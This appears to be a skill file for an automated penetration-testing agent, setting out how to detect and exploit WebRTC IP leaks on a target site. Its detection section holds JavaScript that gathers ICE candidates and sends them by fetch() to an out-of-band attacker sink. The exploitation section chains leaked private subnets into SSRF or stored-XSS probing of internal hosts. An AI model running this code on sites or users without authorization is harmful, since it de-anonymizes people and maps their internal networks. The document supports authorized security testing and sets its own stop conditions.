# WebRTC IP Leak — Vulnerability Skill

**Phase:** 3 | **Skill Type:** Client-Side / Privacy | **Impact:** Low/Medium | **Prerequisite:** Browser automation (Playwright MCP) available, target pages or feature flags using WebRTC (video calls, screen share, voice, WebRTC-based auth/analytics) identified

---

## Mental Model

WebRTC discovers the device's network interfaces to establish peer-to-peer connections. To find a path to the peer, it gathers **ICE candidates** — including *local* (private) IPs like `192.168.x.x`, `10.x.x.x`, and interface details. That discovery is a read operation the browser does for *any* page that creates an `RTCPeerConnection` — no user permission needed (unlike `getUserMedia`).

**The core assumption you're violating:** "The browser hides my local IP and my VPN is enough." By default, modern browsers obfuscate local IPs with `mDNS` (`*.local` candidates) — BUT:
- **mDNS is a default, not a guarantee.** If the page runs a TURN-free config, or the browser's mDNS protection is disabled (corporate policy, `force-mdns` off, enterprise Chrome), the real private IP is exposed.
- **A page can intentionally or accidentally leak the private IP** when it signals its ICE candidates to a server — and that server (or other call participants) can see them.
- **The public IP always leaks** via STUN — which defeats VPN/proxy anonymity for the *page's* connection.

**Why it matters (the impact ladder):**
1. **De-anonymization / privacy** — real public IP bypasses VPN/proxy for that page; private IP enables geolocation and device identification
2. **Network reconnaissance** — knowing the private range (`10.x`, `192.168.x`) reveals the network topology; an attacker chaining this with an SSRF or XSS on the same target can target the *correct* internal subnet
3. **Targeted attacks** — fingerprinting: device model, interfaces count, dual-stack status
4. **Login-bypass / SSRF assist** — some auth or network-access controls trust requests that originate from internal IP ranges; a leaked private IP tells the attacker exactly what to spoof

**Your hunt is two-sided:**
- **A. Passive leak (app behavior):** does the app's own WebRTC/signaling code leak the user's private/public IP to the server or to other users (call metadata, analytics, debug endpoints)?
- **B. Client-capability leak (generic):** does the target's pages (or attacker-supplied content on them, via stored XSS) execute WebRTC and expose the IP where the browser's mDNS protection is off?

---

## Phase 1: OOB-First Detection (MANDATORY)

WebRTC is client-side, so OOB plays the role of the "attacker server" that receives the leaked candidate/identity data.

```bash
./tools/interactsh_launcher.sh start --output-dir engagement/oob/
OOB_URL=$(cat engagement/oob/oob_url.txt)
```

### 1.1 Confirm STUN/external reachability + candidate exfil
From Playwright MCP on the target page:

```js
// If you control an exfil sink, prove the leak goes off-site
const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
pc.createDataChannel('x');
pc.onicecandidate = (e) => {
  if (e.candidate) {
    fetch("http://OOB_URL/ice?c=" + encodeURIComponent(e.candidate.candidate));
  }
};
pc.createOffer().then(o => pc.setLocalDescription(o));
```

```bash
./tools/interactsh_launcher.sh poll --output-dir engagement/oob/ --timeout 30
```

Callbacks carrying candidate data → the page's JS can ship network identity to a remote attacker server. CONFIRMED capability. Then move to Phase 2 to see *what* is exposed (private vs only public) and whether the *app itself* stores it.

---

## Phase 2: Confirmation

### 2.1 Baseline: What Does the Browser Actually Expose?

Run the gatherer inside the target context with Playwright `browser_evaluate`:

```js
async function gatherIce() {
  return new Promise((resolve) => {
    const cands = [];
    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    pc.createDataChannel('leak');
    pc.onicecandidate = (e) => {
      if (e.candidate) cands.push(e.candidate.candidate);
      else resolve(cands);
    };
    pc.createOffer().then((o) => pc.setLocalDescription(o));
  });
}
const results = await gatherIce();
return results;
```

Parse the candidates:
- `typ host` + `192.168.x.x` / `10.x.x.x` / `172.16-31.x.x` → **private IP leaked** (mDNS obfuscation off or bypassed)
- `typ host` + `fe80::` / `fdxx::` → link-local / ULA IPv6
- `typ host` + `*.local` → mDNS protected (default, safe)
- `typ srflx` + public IP → **public IP always visible** (this is by design; note it but don't overclaim)

**Verdict so far:** private IP visible = the browser config allows the leak → finding exists on this browser profile. Private IP as `*.local` = protected by default.

### 2.2 Does the App Collect/Store the Leak? (the reportable bug)

The client-capability leak is usually environmental; the *app bug* is when the app actively captures and stores/exposes this data:

1. Inspect the app's signaling code (bundle audit via spider `understanding/` output) for `RTCPeerConnection`, `onicecandidate`, `candidate` uploads to `/signaling`, `/rtc`, analytics endpoints
2. Trace where ICE candidates go:
   ```bash
   # Monitor via Playwright network capture during a call/room join
   # Look for POST/WS frames containing "candidate" / "candidate-address"
   ```
3. Check if a stored candidate or participant metadata endpoint returns **other users' private IPs**:
   ```bash
   curl -H "Cookie: <SESSION>" "https://target.com/api/rooms/123/participants"
   # If another participant's host candidate (private IP) appears -> server-side leak
   ```
4. Check debug/health/diagnostic endpoints that echo client network info

### 2.3 Cross-Browser Confirmation

mDNS behavior differs by browser/version/settings:
- Test in Playwright Chromium AND a non-mDNS browser profile (or with `--disable-webrtc-mdns`-equivalent settings) to show the conditional exposure
- Corporate Chrome often ships with mDNS disabled → more users affected than the default profile shows

### 2.4 Chain-Readiness Check

If a private IP leaks (environmental or via the app):
- Match the leaked range against the target's internal subnets (from Phase 0 recon)
- Confirm an SSRF/XSS primitive exists to *use* that range (this is what makes it high-impact)

---

## Phase 3: Negative Verdict (MANDATORY GATE)

**DO NOT declare the app-side leak negative without:**

1. Auditing ALL WebRTC usage in the app (calls, screen share, voice notes, callbacks, analytics)
2. Monitoring the network stream during an actual call/room session — static audit misses runtime candidate uploads
3. Checking the participants/metadata API for stored host candidates (server-side persistence of other users' private IPs)
4. Verifying there's no signaling/debug endpoint that echoes client network data

**DO NOT declare the client-capability leak negative without:**

1. Running the gatherer on the target pages themselves (not just your test page)
2. Testing in at least two browser profiles (one with default mDNS, one without)
3. Recording the full candidate set (host + srflx) before judging
4. Checking the app for any explicit call to disable mDNS obfuscation (some apps set `force-mdns` off or configure non-default ICE)

If no app path stores candidates AND the browser profile keeps private IPs behind `*.local` → the leak is not exploitable → NEGATIVE (or informational).

---

## Phase 4: Exploitation

### 4.1 Privacy / De-anonymization Proof
1. Capture the leaked public IP (srflx) and private IP (host) from the target page
2. Cross-check: does the public IP differ from the apparent proxy/VPN egress? Document the discrepancy
3. For a privacy-focused program, that discrepancy IS the impact — real IP bypasses the VPN for that page's connections

### 4.2 Chain: Leak → Targeted SSRF/XSS
1. Leaked private range (`10.10.0.0/16`) → use the [[ssrf]] or [[xss]] primitive to probe `http://10.10.x.x` internal services with the *correct* subnet
2. Document that the WebRTC leak made targeted internal exploitation feasible

### 4.3 App-level Data Exposure
If the app stores/exposes participant candidates:
1. Pull the participants/room-metadata endpoint as a regular user
2. Show another user's private IP/network identity returned in the response
3. That's a direct server-side data-exposure finding independent of the browser environment

**Stop condition:** First confirmed leak (app-level stored candidate, or private IP on an exploitable profile) with evidence. Document, then stop — do not chain into other users' devices.

---

## What You DO
- Run the ICE gatherer inside the **target** page context, not just your test page
- Separate the two findings: client-capability leak (environmental) vs app-storing-the-leak (reportable bug)
- Capture the full candidate set (host + srflx) before analyzing
- Test across browser profiles — mDNS is the deciding factor
- Check signaling traffic during a real call for candidate uploads
- Verify whether the app persists other users' candidates server-side

## What You DO NOT Do
- Report "WebRTC leaks IP" as a universal finding — default browsers mDNS-obfuscate private IPs; overclaiming kills credibility
- Conflate public-IP-via-STUN (by design) with a private-IP leak (a real finding)
- Stop at client-capability proof — the *app storing* the data is the higher-severity, actually reportable bug
- Skip the chain check — this finding is low alone; it becomes valuable when paired with SSRF/XSS on the same target
- Claim VPN bypass impact without demonstrating the public IP differs from the VPN egress

---

## Cross-Skill Links
- [[xss]] — Stored XSS can run the ICE gatherer in a victim's browser (amplifier)
- [[ssrf]] — Leaked private subnet makes internal probing accurate
- [[recon-infra]] — Cross-check leaked ranges with Phase 0 internal network discovery
- [[postmessage]] — Both are client-side primitives often found in the same chat/call widgets
